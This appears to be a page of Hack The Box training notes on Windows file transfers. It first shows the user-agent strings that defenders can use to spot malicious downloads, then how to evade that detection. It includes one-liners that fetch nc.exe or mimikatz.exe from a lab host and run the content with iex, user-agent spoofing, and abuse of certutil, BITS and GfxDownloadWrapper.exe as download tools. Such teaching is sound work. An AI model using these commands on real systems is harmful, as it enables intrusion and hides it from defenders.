## Table of Contents

  - [Table of Contents](#Table\of\Contents)
    - [Detection](#Detection)
      - [Invoke-WebRequest - Client](#Invoke-WebRequest\-\Client)
      - [Invoke-WebRequest - Server](#Invoke-WebRequest\-\Server)
      - [WinHttpRequest - Client](#WinHttpRequest\-\Client)
      - [WinHttpRequest - Server](#WinHttpRequest\-\Server)
      - [Msxml2 - Client](#Msxml2\-\Client)
      - [Msxml2 - Server](#Msxml2\-\Server)
      - [Certutil - Client](#Certutil\-\Client)
      - [Certutil - Server](#Certutil\-\Server)
      - [BITS - Server](#BITS\-\Server)
  - [Evading Detection](#Evading\Detection)
  - [Listing out User Agents](#Listing\out\User\Agents)
      - [Request with Chrome User Agent](#Request\with\Chrome\User\Agent)
      - [Transferring File with GfxDownloadWrapper.exe](#Transferring\File\with\GfxDownloadWrapper.exe)

## Table of Contents

  - [Table of Contents](#Table\of\Contents)
    - [Detection](#Detection)
      - [Invoke-WebRequest - Client](#Invoke-WebRequest\-\Client)
      - [Invoke-WebRequest - Server](#Invoke-WebRequest\-\Server)
      - [WinHttpRequest - Client](#WinHttpRequest\-\Client)
      - [WinHttpRequest - Server](#WinHttpRequest\-\Server)
      - [Msxml2 - Client](#Msxml2\-\Client)
      - [Msxml2 - Server](#Msxml2\-\Server)
      - [Certutil - Client](#Certutil\-\Client)
      - [Certutil - Server](#Certutil\-\Server)
      - [BITS - Server](#BITS\-\Server)
  - [Evading Detection](#Evading\Detection)
  - [Listing out User Agents](#Listing\out\User\Agents)
      - [Request with Chrome User Agent](#Request\with\Chrome\User\Agent)
      - [Transferring File with GfxDownloadWrapper.exe](#Transferring\File\with\GfxDownloadWrapper.exe)



### Detection

User agents are not only used to identify web browsers, but anything acting as an `HTTP` client and connecting to a web server via `HTTP` can have a user agent string (i.e., `cURL`, a custom `Python` script, or common tools such as `sqlmap`, or `Nmap`).

Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows Update, and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. This [website](http://useragentstring.com/index.php) is handy for identifying common user agent strings. A list of user agent strings is available [here](http://useragentstring.com/pages/useragentstring.php).

Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common `HTTP` transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).

#### Invoke-WebRequest - Client

  Invoke-WebRequest - Client

```powershell-session
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

#### Invoke-WebRequest - Server

  Invoke-WebRequest - Server

```shell-session
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

#### WinHttpRequest - Client

  WinHttpRequest - Client

```powershell-session
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```

#### WinHttpRequest - Server

  WinHttpRequest - Server

```shell-session
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

#### Msxml2 - Client

  Msxml2 - Client

```powershell-session
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```

#### Msxml2 - Server

  Msxml2 - Server

```shell-session
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```
#### Certutil - Client

  Certutil - Client

```cmd-session
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

#### Certutil - Server

  Certutil - Server

```shell-session
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```
```powershell-session
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
```

#### BITS - Server

  BITS - Server

```shell-session
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```
This section just scratches the surface on detecting malicious file transfers. It would be an excellent start for any organization to create a whitelist of allowed binaries or a blacklist of binaries known to be used for malicious purposes. Furthermore, hunting for anomalous user agent strings can be an excellent way to catch an attack in progress. We will cover threat hunting and detection techniques in-depth in later modules.


## Evading Detection

**Changing User Agents**
If good admins/defenders have blacklisted any of these user agents. Invoke-WebRequest contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, Or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate

## Listing out User Agents
Listing out User Agents

```powershell-session
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:

#### Request with Chrome User Agent

  Request with Chrome User Agent

```powershell-session
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

  
Request with Chrome User Agent

```shell-session
gdxqpardo@htb[/htb]$ nc -lvnp 80
```

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries." An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:

#### Transferring File with GfxDownloadWrapper.exe

  Transferring File with GfxDownloadWrapper.exe

```powershell-session
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```






























